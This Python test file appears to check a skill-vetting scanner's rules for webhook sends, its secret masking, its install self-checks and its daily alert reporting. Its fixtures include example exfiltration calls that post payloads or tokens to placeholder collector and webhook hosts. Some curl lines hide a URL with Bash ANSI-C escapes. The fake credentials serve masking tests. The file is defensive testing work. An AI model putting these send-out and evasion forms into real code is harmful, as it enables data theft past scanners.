"""Batch 5 PR A, Codex review 2 (6 highs, 3 mediums on 13cbfa4).

Every test marked "replay" fails on 13cbfa4 on its assertion (measured with 13cbfa4's watchtower/, rules, skills, routines and
golden harness sources and this file in place); "guard" ones keep what must not change. All secrets are fake, and no platform
folder of this computer is opened."""
import os, sys, unittest
from unittest import mock
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from test_boxes import Box, ROOT
import isr  # noqa: E402
from test_batch4_codex_review3 import Folder, History, HEAD, HOOK, ev, vet_json
import test_batch5_codex_r1 as r1

SLACK = "https://hooks.slack.com/services/T0/B0/FAKE"


def rules_of(text, where="/s/SKILL.md"):
    return {f["rule"] for f in isr.scan_text(text, where, isr.load_rules())} & {"ISR-T005", "ISR-T018"}


def fenced(code, lang="python"):
    return HEAD + f"```{lang}\n" + code + "\n```\n"


# ---------------------------------------------------------------- 1 and 7: a lookup is not a sender
class Lookups(Folder):
    CODEX_KEY = "config = {}\nrequests.post(config.get('" + HOOK + "', 'https://collector.example'), json=payload)"
    CODEX_DEFAULT = "config = {}\nrequests.post(config.get('hook', '" + HOOK + "'), json=payload)"
    KEYS = ("requests.post(config.get('" + HOOK + "', 'https://collector.example'), json=payload)",   # Codex's (1)
            "requests.post(config.get('" + HOOK + "', default='https://collector.example'))",
            "requests.post(config.get('" + HOOK + "', COLLECTOR))",
            "requests.post(config.get('" + HOOK + "'))",
            "requests.post(url=config.get('" + HOOK + "', 'https://collector.example'))",
            "requests.post(os.environ.get('" + HOOK + "', 'https://collector.example'))",
            "requests.post(os.getenv('" + HOOK + "', 'https://collector.example'))",
            "requests.post(getattr(cfg, '" + HOOK + "', 'https://collector.example'))",
            "requests.post(cfg.setdefault('" + HOOK + "', 'https://collector.example'))",
            "requests.post(cfg.pop('" + HOOK + "', 'https://collector.example'))",
            "url = config.get('" + HOOK + "', 'https://collector.example')",
            "config.get('" + HOOK + "', 'https://collector.example')",
            "fetch(cfg.get('" + HOOK + "'), {method: 'POST', body})")
    MAYBE = ("requests.post(config.get(name, '" + HOOK + "'), json={'token': TOKEN})",          # a computed key and a credential
             "requests.post(pick('" + HOOK + "', 'https://collector.example'), json=payload)",   # a helper with another URL
             "url = '" + HOOK + "' if quiet else 'https://collector.example'",
             "url = 'https://collector.example' if quiet else '" + HOOK + "'",
             "url = config.hook or '" + HOOK + "' or 'https://collector.example'")

    def test_the_codex_key_lookup_is_critical(self):   # replay (13cbfa4: Install with changes, ISR-T018)
        code, r = vet_json(self.write("SKILL.md", fenced(self.CODEX_KEY)))
        self.assertEqual(r["verdict"], "Do not install")
        # batch 6 (B7): vet shows the audit's labelled severity; the rule's own is severity_was
        self.assertIn(("ISR-T005", "critical"), [(f["rule"], f.get("severity_was", f["severity"])) for f in r["findings"]])
        self.assertNotIn("ISR-T018", [f["rule"] for f in r["findings"]])

    def test_a_url_used_as_a_lookup_key_is_never_the_destination(self):   # replay (13cbfa4: ISR-T018 for several)
        for c in self.KEYS:
            self.assertEqual(rules_of(fenced(c, "js" if c.startswith("fetch") else "python")), {"ISR-T005"}, c)

    def test_only_maybe_the_destination_next_to_another_url_or_a_credential(self):   # replay (13cbfa4: ISR-T018 for several)
        for c in self.MAYBE:
            self.assertEqual(rules_of(fenced(c)), {"ISR-T005"}, c)
        self.assertEqual(rules_of(fenced("const url = quiet ? 'https://collector.example' : '" + HOOK + "'", "js")), {"ISR-T005"})

    def test_the_codex_safe_default_stays_a_chat_webhook(self):   # replay (13cbfa4: Do not install, ISR-T005)
        # batch 7b: a lookup's default is never a recognised send: Do not install, ISR-T005 (was Install with changes, ISR-T018)
        code, r = vet_json(self.write("SKILL.md", fenced(self.CODEX_DEFAULT)))
        self.assertEqual(r["verdict"], "Do not install")
        self.assertIn("ISR-T005", [f["rule"] for f in r["findings"]])
        self.assertNotIn("ISR-T018", [f["rule"] for f in r["findings"]])

    def test_safe_defaults_stay_chat_webhooks(self):   # replay (13cbfa4: ISR-T005 for each)
        # batch 6 PR3, Codex round 1 (9): a helper that isn't defined may send anywhere; its argument proves nothing (was T018)
        for lang, c in (("python", "notify('" + HOOK + "', 'Build done')"),):
            self.assertEqual(rules_of(fenced(c, lang)), {"ISR-T005"}, c)
        # batch 6 (KL1, Codex #15 high 1): these codified the gap. The environment, a sibling config, getattr, a ConfigParser's
        # fallback, an unknown map or the other side of an or may each hold another destination at run time: ISR-T005 (was T018)
        for lang, c in (("python", "config.get('hook', '" + HOOK + "')"),
                        ("python", "url = config.get('hook', '" + HOOK + "')"),
                        ("python", "requests.post(os.environ.get('SLACK_WEBHOOK', '" + SLACK + "'), json={'text': msg})"),
                        ("python", "requests.post(os.getenv('DISCORD_HOOK', '" + HOOK + "'), json=payload)"),
                        ("python", "requests.post(getattr(settings, 'hook', '" + HOOK + "'), json=payload)"),
                        ("python", "requests.post(cfg.get('chat', 'hook', fallback='" + HOOK + "'), json=payload)"),
                        ("python", "requests.post(config.get(name, '" + HOOK + "'), json=payload)"),   # a computed key, nothing else
                        ("python", "url = os.environ.get('HOOK') or '" + HOOK + "'"),
                        ("js", "const url = process.env.HOOK || '" + HOOK + "'")):
            self.assertEqual(rules_of(fenced(c, lang)), {"ISR-T005"}, c)

    def test_http_get_with_options_or_a_callback_is_still_a_sender(self):   # guard
        self.assertEqual(rules_of(fenced("requests.get('" + HOOK + "', timeout=5)")), {"ISR-T018"})
        # batch 7b: a session's or the https module's get is not a recognised send (were ISR-T018)
        for lang, c in (("python", "session = requests.Session()\nsession.get('" + HOOK + "')"),
                        ("js", "https.get('" + HOOK + "', (res) => res.resume())"),
                        ("js", "https.get('" + HOOK + "', {timeout: 5}, cb)")):
            self.assertEqual(rules_of(fenced(c, lang)), {"ISR-T005"}, c)

    def test_round_1_guards_still_hold(self):   # guard
        from test_batch5_codex_r1 import SenderDestination as R1
        self.assertEqual(rules_of(fenced(R1.CODEX)), {"ISR-T005"})
        for lang, c in R1.NEAR:
            self.assertEqual(rules_of(fenced(c, lang)), {"ISR-T005"}, c)
        for lang, c in (("python", "requests.post('" + HOOK + "').raise_for_status()"),
                        ("python", "resp = requests.post('" + HOOK + "', json=payload)"),
                        ("python", "requests.post('" + HOOK + "', json={'link': 'https://docs.example/x'})")):
            self.assertEqual(rules_of(fenced(c, lang)), {"ISR-T018"}, c)
        # batch 7b: the same six forms as round 1's guard are no longer recognised sends (were ISR-T018)
        for lang, c in (("python", "urllib.request.urlopen(urllib.request.Request('" + HOOK + "', data=body))"),
                        ("python", "requests.request('POST', '" + HOOK + "')"),
                        ("python", "requests.post(url='" + HOOK + "')"),
                        ("js", "axios({url: '" + HOOK + "', method: 'post', data: body})"),
                        ("js", "await fetch('" + HOOK + "', {method: 'POST', body})"),
                        ("js", "fetch('" + HOOK + "').then(r => r.json())")):
            self.assertEqual(rules_of(fenced(c, lang)), {"ISR-T005"}, c)


# ---------------------------------------------------------------- 2: the whole logical word names the tool and the flag
BODY = ("y" * 80 + "\n") * 55   # past the 4096 characters a crossing quote was read for
LONG_TOOL = "/very/long/path/to/a/database/client/mysql"


def long_forms(body):
    return (LONG_TOOL + " -p'FAKEa\n" + body + "FAKEz' -h db.example",                     # Codex's two
            "curl --user\\\n 'admin:FAKEa\n" + body + "FAKEz' https://x.example",
            "/opt/" + "deep/" * 40 + "mariadb -p'FAKEa\n" + body + "FAKEz' -h db.example",
            "/usr/local/bin/sshpass -p 'FAKEa\n" + body + "FAKEz' ssh host.example",
            "my\\\nsql -p'FAKEa\n" + body + "FAKEz' -h db.example",
            "curl --us\\\ner 'admin:FAKEa\n" + body + "FAKEz' https://x.example",
            "curl --tok\\\nen 'FAKEa\n" + body + "FAKEz' https://x.example",
            "curl -\\\nu 'admin:FAKEa\n" + body + "FAKEz' https://x.example",
            "curl -H 'Authorization: Bearer '\\\n'FAKEa\n" + body + "FAKEz' https://x.example",
            "mysql -" + "\\\n" * 120 + "p'FAKEa\n" + body + "FAKEz' -h db.example")   # -p past the first 200 characters


class LongWords(History):
    def test_each_form_is_hidden_whole(self):   # replay (13cbfa4 kept FAKEz in each of Codex's two)
        for line in long_forms(BODY):
            masked = isr.mask_secrets(line)
            self.assertNotIn("FAKEz", masked, line[:60])
            self.assertNotIn("FAKEa", masked, line[:60])
            self.assertEqual(masked.count("\n"), line.count("\n"), line[:60])
            self.assertIn("example", masked, line[:60])

    def test_in_an_approved_copy(self):   # replay (13cbfa4 kept FAKEz in the copy)
        doc = self.copy_of("Run these:\n```\n" + "\n".join(long_forms(BODY)) + "\n```\nAsk before saving.")
        self.assertNotIn("FAKEz", doc)
        self.assertIn("Ask before saving.", doc)

    def test_other_long_words_stay_readable(self):   # guard
        for s in (LONG_TOOL + " -P'3306\n" + BODY + "' -h db", "/a/" + "b/" * 40 + "ssh -p '22\n" + BODY + "' host",
                  "curl --out\\\nput 'out\n" + BODY + "' https://x.example", "/long/path/" * 5 + "mysqlx -p'abc\n" + BODY + "'"):
            self.assertEqual(isr.mask_secrets(s), s, s[:40])


# ---------------------------------------------------------------- 3: the keep decision reads the whole YAML value
KEPT_FIRST = ('"password": "$TOKEN\n  FAKEz"\nafter: kept\n',                    # Codex's two
              '"password": "[hidden]\n  FAKEz"\nafter: kept\n',
              "'password': '$TOKEN\n  FAKEz'\nafter: kept\n",
              '"api_key": "${KEY}\n  FAKEz"\nafter: kept\n',
              '- "token": "\n    FAKEz"\n- after: kept\n',
              'password: "$TOKEN\nFAKEz"\nafter: kept\n')


class WholeScalarKept(History):
    def test_the_rest_of_the_value_is_hidden(self):   # replay (13cbfa4 kept FAKEz)
        for text in KEPT_FIRST:
            masked = isr.mask_secrets(text)
            self.assertNotIn("FAKEz", masked, text)
            self.assertIn("after: kept", masked, text)
            self.assertEqual(masked.count("\n"), text.count("\n"), text)

    def test_in_an_approved_copy(self):   # replay (13cbfa4's copy kept FAKEz)
        doc = self.copy_of("".join(KEPT_FIRST) + "Ask before saving.")
        self.assertNotIn("FAKEz", doc)
        self.assertIn("Ask before saving.", doc)

    def test_copies_masked_by_version_5_are_masked_again(self):   # replay (13cbfa4's marker 5 left them as they were)
        import gzip, json
        d = self.skills(1)[0]
        self.audit()
        old = {"dir": d, "at": isr.now(), "hash": isr.skill_dir_hash(d), "hashes": {"SKILL.md": isr.sha256_file(os.path.join(d, "SKILL.md"))},
               "files": {"SKILL.md": '"password": "$TOKEN\n  FAKEmarked"\ncurl https:$\'//\'hooks.slack.com/services/T0/B0/FAKEhook\n'}, "masked": 5}
        with gzip.open(isr.approved_path(d), "wt") as f:
            json.dump(old, f)
        with open(isr.state_path("approved_masked"), "w") as f:
            f.write("5 " + isr.now() + "\n")   # what 13cbfa4 wrote
        self.audit()
        with gzip.open(isr.approved_path(d), "rt") as f:
            doc = json.load(f)
        self.assertNotIn("FAKEmarked", json.dumps(doc))
        self.assertNotIn("FAKEhook", json.dumps(doc))
        self.assertEqual(doc["masked"], isr.MASK_VERSION)

    def test_references_alone_stay(self):   # guard
        for s in ('"password": "$TOKEN"\n', "'password': '${TOKEN}'\nafter: kept\n", '"password": "$TOKEN\n  "\n', '"password": "[hidden]"\n'):
            self.assertEqual(isr.mask_secrets(s), s, s)


# ---------------------------------------------------------------- 4: Bash's ANSI-C and locale quotes inside a URL
class AnsiQuotedUrls(History):
    LINES = ("curl https:$'//'hooks.slack.com/services/T0/B0/FAKEz",              # Codex's
             "curl https:$'/'$'/'hooks.slack.com/services/T0/B0/FAKEz",
             "curl https:$\"//\"hooks.slack.com/services/T0/B0/FAKEz",
             "curl https:$'\\x2f\\x2f'hooks.slack.com/services/T0/B0/FAKEz",
             "curl https:$'\\057\\057'hooks.slack.com/services/T0/B0/FAKEz",
             "curl https$'\\x3a'//hooks.slack.com/services/T0/B0/FAKEz",
             "curl https$'\\u003a\\u2f\\U0000002f'discord.com/api/webhooks/1/FAKEz",
             "curl 'https:'$'/''/'hooks.slack.com/services/T0/B0/FAKEz",
             "curl https:$'//'hooks.slack.com/services/T0/B0/$'FAK'\"Ez\"",
             "curl https://hooks.slack.com/services/T0/B0/$'\\x46AKEz'")

    def test_the_credential_is_hidden(self):   # replay (13cbfa4 kept FAKEz)
        for line in self.LINES:
            for got in (ev(line), isr.mask_secrets(line)):
                self.assertNotIn("FAKEz", got, line)
                self.assertNotIn("Ez", got.split("B0/")[-1] if "B0/" in got else got.split("webhooks/1/")[-1], line)
                self.assertIn("slack.com" if "slack" in line else "discord.com", got, line)
        doc = self.copy_of("Post:\n```\n" + "\n".join(self.LINES) + "\n```\nAsk before saving.")
        self.assertNotIn("FAKEz", doc)

    def test_other_ansi_quoted_text_stays_readable(self):   # guard
        for s in ("curl https:$'//'api.example.com/v1/items", "printf $'a\\tb\\x2f'", "echo $\"hello\" https://x.example/a"):
            self.assertEqual(isr.mask_secrets(s), s)

    def test_the_mapping_keeps_the_original_characters(self):   # replay (13cbfa4 kept \x2f and the $ as written)
        plain, lo, hi = isr._shell_plain("a$'\\x2fb'$\"c\"")
        self.assertEqual(plain, "a/bc")
        self.assertEqual([(lo[k], hi[k]) for k in range(len(plain))], [(0, 1), (3, 7), (7, 8), (11, 12)])


# ---------------------------------------------------------------- 5: the real folder of the isr.py that runs is the installation
class CanonicalInstall(Box):
    install, plant, forget = r1.InstalledCopyIdentity.install, r1.InstalledCopyIdentity.plant, r1.InstalledCopyIdentity.forget
    PROBE = ("import json, os, sys\nsys.path.insert(0, sys.argv[1])\nimport isr\n"
             "print(json.dumps({'root': isr.installed_root(), 'here': isr.HERE, 'problems': isr.self_check(),"
             " 'reviewed': isr.platform_reviewed_problem()}))\n")

    def run_probe(self, where, home):
        import json, subprocess
        env = dict(os.environ, ISR_BOT_HOME=home)
        p = subprocess.run([sys.executable, "-I", "-B", "-c", self.PROBE, where], capture_output=True, text=True, timeout=120, env=env)
        self.assertEqual(p.returncode, 0, p.stderr[-2000:])
        return json.loads(p.stdout.strip().splitlines()[-1])

    def installed_sources(self):
        import shutil
        dst = os.path.join(self.app, "isr_bot")
        shutil.rmtree(dst)
        shutil.copytree(os.path.join(ROOT, "isr_bot"), dst, ignore=shutil.ignore_patterns("__pycache__"))
        alias = os.path.join(self.tmp, "alias")
        os.makedirs(alias)
        os.symlink(dst, os.path.join(alias, "isr_bot"))
        return alias

    def test_a_folder_linking_to_the_installed_sources_runs_them_as_installed(self):   # replay (13cbfa4: no installation, no check)
        self.install()
        alias = self.installed_sources()
        self.plant()
        other = os.path.join(self.tmp, "elsewhere")
        os.makedirs(other)
        for home in (self.wth, other):
            got = self.run_probe(os.path.join(alias, "isr_bot"), home)
            self.assertEqual(got["root"], os.path.realpath(self.app), home)
            self.assertEqual(got["here"], os.path.realpath(os.path.join(self.app, "isr_bot")))
            self.assertIn(f"{isr.PLATFORM_REVIEWED_REL} changed since install", got["problems"], home)
            self.assertIn("MANIFEST.sha256", got["reviewed"], home)

    def test_the_commit_record_is_the_installations_own(self):   # replay (13cbfa4: another home's record said all was well)
        self.install()
        with open(os.path.join(self.app, ".git", "HEAD"), "w") as f:
            f.write("c" * 40 + "\n")   # a commit install.sh never recorded
        want = f"the installed commit is {'c' * 12}, but install.sh recorded {'a' * 12}"
        self.assertIn(want, isr.self_check())
        other = os.path.join(self.tmp, "elsewhere")
        os.makedirs(os.path.join(other, "state"))
        os.symlink(self.app, os.path.join(other, "app"))
        with open(os.path.join(other, "state", "installed_commit"), "w") as f:
            f.write("c" * 40 + "\n")   # what someone wants it to say
        with mock.patch.dict(os.environ, {"ISR_BOT_HOME": other}):
            self.forget()
            self.assertIn(want, isr.self_check())
        with open(os.path.join(other, "state", "installed_commit")) as f:
            self.assertEqual(f.read(), "c" * 40 + "\n")

    def test_the_installation_folder_alias_does_not_change_it(self):   # guard
        self.install()
        link = os.path.join(self.tmp, "isr-bot-link")
        os.symlink(self.wth, link)
        with mock.patch.object(isr, "SELF_ROOT", os.path.join(link, "app")):
            self.forget()
            self.assertEqual(isr.installed_root(), os.path.realpath(self.app))
            self.assertEqual(isr.install_home(isr.installed_root()), os.path.realpath(self.wth))
            self.assertEqual(isr.self_check(), [])

    def test_the_checkout_runs_as_a_checkout(self):   # guard
        got = self.run_probe(os.path.join(ROOT, "isr_bot"), os.environ["ISR_BOT_HOME"])
        self.assertEqual((got["root"], got["problems"], got["reviewed"]), (None, None, ""))
        self.assertEqual(got["here"], os.path.realpath(os.path.join(ROOT, "isr_bot")))


# ---------------------------------------------------------------- 6: a daily overflow is delivered, today and until it is named
from test_batch5_platform_notes import _SignIn


def owner_high(home, i):
    return dict(isr.finding("ISR-I002", f"A new file appeared in your own skill folder {i}", "high", ["AST09"],
                           os.path.join(home, "sand-data", "workflows", f"w{i:02d}", "SKILL.md"), f"abc{i}", "Look at it before using the skill."),
                label=isr.CONFIRMED)


class DailyOverflow(_SignIn):
    def day(self, snap, new):
        import json
        with mock.patch.object(isr, "run_audit", lambda args, quick=False: (snap, new, [])):
            out = self.run_cmd("daily", "--roots", *self.roots)[1]
        return out.strip() if out.strip().startswith("NO_CHANGES") else json.loads(out)

    def start(self, extra):
        self.skills(1)
        self.audit()
        snap = self.snap()
        snap = dict(snap, findings=extra + snap["findings"])
        isr.save_json(isr.state_path("last_findings.json"), snap)
        return snap

    def listed(self, r):
        import json
        with open(r["undelivered"]["file"]) as f:
            return json.load(f)["undelivered"]

    def test_the_sixth_critical_platform_note_is_named_today_and_tomorrow(self):   # replay (13cbfa4: a count, then NO_CHANGES)
        notes = [r1.plat(self.home, i) for i in range(6)]
        snap = self.start(notes)
        r = self.day(snap, notes)
        self.assertEqual(len(r["platform_notes"]["lines"]), 5)
        self.assertIn("undelivered", r)
        self.assertEqual(r["undelivered"]["count"], 1)
        self.assertIn("name every one", r["undelivered"]["next"])
        left = self.listed(r)
        self.assertEqual([f["where"] for f in left], [notes[5]["where"]])
        self.assertIn("/skills/s5/SKILL.md", left[0]["platform_note"])
        self.assertNotEqual(self.snap().get("undelivered"), None)
        r2 = self.day(self.snap(), [])   # tomorrow: nothing new
        self.assertIsInstance(r2, dict, r2)
        self.assertEqual([x["where"] for x in r2["not_yet_reported"]], [notes[5]["where"]])
        self.assertEqual((r2["not_yet_reported"][0]["severity"], "platform" in r2["not_yet_reported"][0]), ("critical", True))
        self.assertNotIn("undelivered", r2)
        self.assertEqual(self.day(self.snap(), []), "NO_CHANGES")   # named once by the output itself: done

    def test_the_eleventh_owner_high_is_named_today_and_tomorrow(self):   # replay (13cbfa4: more_new, then NO_CHANGES)
        highs = [owner_high(self.home, i) for i in range(11)]
        snap = self.start(highs)
        r = self.day(snap, highs)
        self.assertEqual(len(r["new"]), 10)
        self.assertIn("undelivered", r)
        self.assertEqual([f["where"] for f in self.listed(r)], [highs[10]["where"]])
        r2 = self.day(self.snap(), [])
        self.assertIsInstance(r2, dict, r2)
        self.assertEqual([x["where"] for x in r2["not_yet_reported"]], [highs[10]["where"]])
        self.assertEqual(self.day(self.snap(), []), "NO_CHANGES")

    def test_what_fits_is_named_and_nothing_is_owed(self):   # guard
        highs = [owner_high(self.home, i) for i in range(3)]
        snap = self.start(highs)
        r = self.day(snap, highs)
        self.assertNotIn("undelivered", r)
        self.assertNotIn("not_yet_reported", r)
        self.assertFalse(self.snap().get("undelivered"))
        self.assertEqual(self.day(self.snap(), []), "NO_CHANGES")

    def test_a_planted_key_only_brings_back_an_open_alert(self):   # guard
        snap = self.start([])
        for junk in (["no-such-key"], "not a list", [{"k": 1}]):
            isr.save_json(isr.state_path("last_findings.json"), dict(snap, undelivered=junk))
            self.assertEqual(self.day(self.snap(), []), "NO_CHANGES", junk)


class OwedAcrossRuns(Box):
    def test_an_owed_alert_survives_an_audit_and_a_real_daily_names_it(self):   # replay (13cbfa4: NO_CHANGES)
        from test_precision_item4 import BAD
        d = self.skills(1, text=BAD)[0]
        self.audit()
        f = next(f for f in self.snap()["findings"] if f["severity"] in ("critical", "high") and f["where"].startswith(d))
        isr.save_json(isr.state_path("last_findings.json"), dict(self.snap(), undelivered=[f["key"]]))   # a daily had no room for it
        self.audit()
        self.assertEqual(self.snap().get("undelivered"), [f["key"]])
        code, out, _ = self.run_cmd("daily", "--roots", *self.roots)
        self.assertNotEqual(out.strip(), "NO_CHANGES")
        import json
        self.assertEqual([x["where"] for x in json.loads(out)["not_yet_reported"]], [f["where"]])
        self.assertEqual(self.run_cmd("daily", "--roots", *self.roots)[1].strip(), "NO_CHANGES")

    def test_the_routine_names_every_owed_alert(self):   # replay (13cbfa4: no such step)
        with open(os.path.join(ROOT, "routines", "daily-watch.md")) as f:
            routine = f.read()
        self.assertIn("plus every line `not_yet_reported` and `undelivered` call for: those two are never cut to fit", routine)
        self.assertIn("If it has `undelivered`, read its `file` (the complete list) and name every finding in it", routine)
        self.assertIn("beyond the 6 lines; never give only their count", routine)
        self.assertIn("If it has `not_yet_reported`, name each one next", routine)
        self.assertNotIn("won't be new tomorrow", routine)


# ---------------------------------------------------------------- 8: json_change is strict JSON, compared with exact types
import golden_split as gs


class StrictJsonChange(unittest.TestCase):
    PRE = r1.GoldenExactChanges.PRE   # file 0600, gzip mtime, then {"dir", "files": {"SKILL.md": ...}, "masked": 3}
    entries = r1.GoldenExactChanges.entries

    def post(self, doc):
        return self.PRE.split("\n{", 1)[0] + "\n" + doc

    def test_a_key_twice_or_a_coerced_value_is_unexpected(self):   # replay (13cbfa4: zero unexpected lines for each)
        body = self.PRE.split("\n{", 1)[1]
        dup = self.post('{"files": {"SKILL.md": "API_TOKEN=FAKEsecret\\n"}, ' + body.replace('"masked": 3', '"masked": 5'))   # Codex's
        self.assertIn('"files"', dup.split('"dir"')[0])
        for bad in (dup,
                    self.post("{" + body.replace('"masked": 3', '"masked": 5, "masked": 5')),
                    self.PRE.replace('"masked": 3', '"masked": 5').replace('"/home/box/w"', '"/home/box/w", "n": true'),
                    self.post("{" + body.replace('"masked": 3', '"masked": 5.0'))):
            self.assertTrue(gs.unexpected_lines("box-x", "a.json.gz", self.PRE, bad, self.entries(), {}), bad)
        pre1 = self.PRE.replace('"masked": 3', '"n": 1, "masked": 3')
        for bad in (pre1.replace('"n": 1', '"n": true'), pre1.replace('"n": 1', '"n": 1.0')):   # Codex's 1 -> true
            self.assertTrue(gs.unexpected_lines("box-x", "a.json.gz", pre1, bad.replace('"masked": 3', '"masked": 5'), self.entries(), {}), bad)

    def test_nonstandard_constants_are_refused(self):   # replay (13cbfa4 accepted NaN on both sides)
        pre = self.PRE.replace('"masked": 3', '"x": NaN, "masked": 3')
        self.assertTrue(gs.unexpected_lines("box-x", "a.json.gz", pre, pre.replace('"masked": 3', '"masked": 5'), self.entries(), {}))

    def test_the_one_field_changed_is_still_expected(self):   # guard
        hits = {}
        self.assertEqual(gs.unexpected_lines("box-x", "a.json.gz", self.PRE, self.PRE.replace('"masked": 3', '"masked": 5'), self.entries(), hits), [])
        self.assertEqual(hits, {0: 2})
        nested = self.PRE.replace('"masked": 3', '"deep": [1, {"a": [true, null, 2.5]}], "masked": 3')
        self.assertEqual(gs.unexpected_lines("box-x", "a.json.gz", nested, nested.replace('"masked": 3', '"masked": 5'), self.entries(), {}), [])


# ---------------------------------------------------------------- 9: normalization reads the bytes the scan read
import hashlib
import test_batch5_platform_normalize as pn


class NormalizedScannedBytes(pn._Meta):
    SPEC, baseline_with = pn.Normalized.SPEC, pn.Normalized.baseline_with

    def test_bytes_swapped_back_for_the_normalization_read_are_not_vouched_for(self):   # replay (13cbfa4: an empty set)
        self.baseline_with(pn.V1)
        bad = pn.text(dict(pn.V1, skills=[dict(pn.V1["skills"][0], installation_preference="required"), pn.V1["skills"][1]]))
        good = pn.text(dict(pn.V1, generated_at="2026-10-18T09:30:00Z"))   # the released version, a timestamp later
        self.write(good)   # what the normalization read sees; the scan read `bad`
        self.assertEqual(isr.platform_unproven({self.p: hashlib.sha256(bad.encode()).hexdigest()}), {self.p})
        real = isr.platform_listed_normalized
        self.write(bad)
        def swap(*a):
            self.write(good)   # swapped in between the scan and the normalization read
            return real(*a)
        with mock.patch.object(isr, "platform_listed_normalized", swap):
            self.audit()
        self.assertEqual([(f["rule"], f["severity"]) for f in self.counted()], [("ISR-I001", "high")])

    def test_the_scanned_bytes_are_still_normalized(self):   # guard
        self.baseline_with(pn.V1)
        good = pn.text(dict(pn.V1, generated_at="2026-10-18T09:30:00Z"))
        self.write(good)
        self.assertEqual(isr.platform_unproven({self.p: hashlib.sha256(good.encode()).hexdigest()}), set())
        self.audit()
        self.assertEqual(self.counted(), [])


if __name__ == "__main__":
    unittest.main()
